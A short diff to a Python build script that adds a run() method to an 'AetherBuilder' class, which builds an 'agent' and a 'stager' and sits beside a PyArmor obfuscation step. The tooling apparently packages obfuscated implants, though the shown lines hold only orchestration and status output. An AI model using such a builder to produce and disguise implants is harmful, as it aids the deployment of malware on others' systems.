@@ -672,6 +672,38 @@ def obfuscate_with_pyarmor():
         
         return True
 
+    def run(self):
+        """Run the complete build process."""
+        try:
+            print(f"\n[*] Starting AETHER build process...")
+            print(f"[*] Build ID: {self.build_id}\n")
+            
+            # Try to build agent
+            agent_success = False
+            try:
+                agent_success = self.build_agent()
+                if agent_success:
+                    print("[+] Agent built successfully")
+            except Exception as e:
+                print(f"[-] Agent build error: {str(e)}")
+                agent_success = False
+            
+            # Try to build stager
+            stager_success = False
+            try:
+                stager_success = self.build_stager()
+                if stager_success:
+                    print("[+] Stager built successfully")
+            except Exception as e:
+                print(f"[-] Stager build error: {str(e)}")
+                stager_success = False
+            
+            # Return success if at least agent built successfully
+            return agent_success
+        except Exception as e:
+            print(f"[-] Build process error: {str(e)}")
+            return False
+
 def main():
     """Entry point."""
     builder = AetherBuilder()
